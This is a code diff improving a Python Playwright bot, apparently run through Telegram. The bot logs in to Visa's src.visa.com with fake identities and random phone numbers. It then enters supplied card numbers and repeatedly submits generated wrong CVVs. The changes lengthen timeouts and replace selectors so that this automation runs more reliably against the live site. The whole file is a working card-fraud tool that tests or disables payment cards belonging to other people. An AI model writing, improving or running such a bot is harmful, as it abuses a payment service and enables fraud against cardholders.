@@ -6,7 +6,7 @@ import traceback
 from playwright.async_api import BrowserContext
 from worker.utils import get_fake_identity, get_wrong_cvv, split_card, get_bin_info, tg_edit, tg_admin_screenshot
 
-TIMEOUT = 4000
+TIMEOUT = 6000
 
 
 async def run(ctx: BrowserContext, card_input: str, chat_id: int, message_id: int) -> bool:
@@ -21,64 +21,58 @@ async def run(ctx: BrowserContext, card_input: str, chat_id: int, message_id: in
         bin_task = asyncio.create_task(get_bin_info(cc[:6]))
 
         await tg_edit(chat_id, message_id, "⚡ Processing (ultra-fast)...")
-        await page.goto("https://src.visa.com/login", wait_until="domcontentloaded", timeout=15000)
+        await page.goto("https://src.visa.com/login", wait_until="domcontentloaded", timeout=20000)
 
+        # Cookie banner
         try:
-            await page.wait_for_selector("a.wscrOk", timeout=2000)
+            await page.wait_for_selector("a.wscrOk", timeout=2500)
             await page.click("a.wscrOk")
         except Exception:
             pass
 
-        # Step 1 — Login
+        # STEP 1 — Email
         await page.wait_for_selector("#email-input", state="visible", timeout=TIMEOUT)
         await page.fill("#email-input", identity["email"])
-        await page.click("xpath=//button[.//div[normalize-space()='Continue']]")
+        await page.click("button.v-button:has(div:text('Continue'))")
 
-        await page.wait_for_selector("#login-phone-input-number", timeout=TIMEOUT)
+        # Phone
+        await page.wait_for_selector("#login-phone-input-number", state="visible", timeout=TIMEOUT)
         phone = (
             random.choice(["201", "202", "203", "205", "206", "207"])
             + random.choice(["201", "202", "303", "404"])
             + "".join(random.choices("0123456789", k=4))
         )
-        await page.evaluate("id => { const el = document.getElementById(id); if(el) el.value=''; }", "login-phone-input-number")
         await page.fill("#login-phone-input-number", phone)
-        await page.click("xpath=//input[@type='checkbox']")
-        await page.click("xpath=//button[.//div[normalize-space()='Next']]")
+        await page.check("input.v-checkbox[type='checkbox']")
+        await page.click("button.v-button:has(div:text('Next'))")
 
-        # Step 2 — Card
-        await page.wait_for_selector("#first-name-input", state="visible", timeout=TIMEOUT)
-        await asyncio.gather(
-            page.fill("#first-name-input", identity["first_name"]),
-            page.fill("#last-name-input", identity["last_name"]),
-        )
-        await page.evaluate("id => { const el = document.getElementById(id); if(el) el.value=''; }", "card-input")
+        # STEP 2 — Card info
+        await page.wait_for_selector("#card-input", state="visible", timeout=TIMEOUT)
+        await page.fill("#first-name-input", identity["first_name"])
+        await page.fill("#last-name-input", identity["last_name"])
         await page.fill("#card-input", cc)
         await page.fill("#expiration-input", mm + yy)
         await page.fill("#cvv-input", wrong_cvv)
 
-        # Step 3 — Address
+        # STEP 3 — Address
+        await page.wait_for_selector("#line1-input", state="visible", timeout=TIMEOUT)
         try:
-            await page.wait_for_selector('[data-testid="region-select"]', timeout=TIMEOUT)
             country_val = await page.input_value('[data-testid="region-select"]')
             if "United States" not in country_val:
+                await page.click('[data-testid="region-select"]')
                 await page.fill('[data-testid="region-select"]', "United States")
                 await page.keyboard.press("Enter")
         except Exception:
             pass
+        await page.fill("#line1-input", identity["address"])
+        await page.fill("#city-input", identity["city"])
+        await page.fill("#stateProvinceCode-input", identity["state"])
+        await page.fill("#zip-input", identity["zip"])
+        await page.click("div:text-is('Add card')")
 
-        await asyncio.gather(
-            page.fill("#line1-input", identity["address"]),
-            page.fill("#city-input", identity["city"]),
-            page.fill("#stateProvinceCode-input", identity["state"]),
-            page.fill("#zip-input", identity["zip"]),
-        )
-
-        add_btn_sel = "xpath=//div[normalize-space()='Add card']"
-        await page.wait_for_selector(add_btn_sel, timeout=TIMEOUT)
-        await page.click(add_btn_sel)
         await tg_edit(chat_id, message_id, "⚡ Updating (ultra-fast)...")
 
-        # Step 4 — CVV loop (dd style: 5 attempts)
+        # STEP 4 — CVV loop
         used = {wrong_cvv}
         for _ in range(5):
             fake = get_wrong_cvv(real_cvv)
@@ -86,8 +80,9 @@ async def run(ctx: BrowserContext, card_input: str, chat_id: int, message_id: in
                 fake = get_wrong_cvv(real_cvv)
             used.add(fake)
             try:
+                await page.wait_for_selector("#cvv-input", state="visible", timeout=TIMEOUT)
                 await page.fill("#cvv-input", fake)
-                await page.click(add_btn_sel)
+                await page.click("div:text-is('Add card')")
                 await page.wait_for_timeout(150)
             except Exception:
                 pass
